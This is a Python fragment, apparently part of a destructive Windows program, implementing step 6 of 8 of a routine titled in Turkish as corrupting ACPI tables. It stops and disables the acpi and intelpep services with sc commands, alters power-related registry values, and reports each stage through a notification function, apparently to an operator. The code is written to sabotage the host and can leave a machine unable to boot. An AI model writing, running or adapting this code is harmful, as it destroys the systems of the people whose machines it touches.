# ==========================================
# 6) ACPI TABLOLARI
# ==========================================
def kill_acpi():
    send_notification("🔌 [6/8] ACPI tabloları bozuluyor...")
    try:
        subprocess.run('sc stop acpi', shell=True, capture_output=True)
        subprocess.run('sc config acpi start= disabled', shell=True, capture_output=True)
        subprocess.run('sc stop intelpep', shell=True, capture_output=True)
        subprocess.run('sc config intelpep start= disabled', shell=True, capture_output=True)
        key = winreg.HKEY_LOCAL_MACHINE
        path = r"SYSTEM\CurrentControlSet\Control\Power"
        try:
            with winreg.OpenKey(key, path, 0, winreg.KEY_SET_VALUE) as reg:
                winreg.SetValueEx(reg, "HiberbootEnabled", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(reg, "CsEnabled", 0, winreg.REG_DWORD, 0)
        except:
            pass
        send_notification("✅ [6/8] ACPI başarılı!")
        return True
    except Exception as e:
        send_notification(f"❌ [6/8] ACPI hatası: {e}")
        return False

